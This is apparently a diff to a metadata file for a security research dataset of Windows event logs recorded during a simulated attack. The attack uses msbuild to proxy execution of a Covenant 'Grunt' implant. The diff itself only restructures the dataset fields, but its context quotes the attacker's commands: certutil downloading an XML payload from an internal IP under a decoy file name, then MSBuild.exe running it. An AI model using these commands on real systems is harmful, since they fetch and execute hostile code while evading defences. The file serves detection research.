@@ -14,8 +14,9 @@ permissions_required:
   - Administrator
 description: This dataset represents adversaries using trusted windows utilities such as msbuild to proxy execution of malicious code.
 dataset:
-  type: small
-  file: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/covenant_msbuild_grunt.tar.gz
+  - size: small
+    type: Windows Event Logs
+    link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/covenant_msbuild_grunt.tar.gz
 attack_mappings:
   - technique: T1127
     sub-technique: "001"
@@ -28,3 +29,4 @@ adversary_view: |-
   opened as Administrator and ran the following:
   certutil.exe -urlcache -split -f http://172.18.39.8/msbuildGrunt.xml C:\ProgramData\salaries.xml
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\ProgramData\salaries.xml
+references:
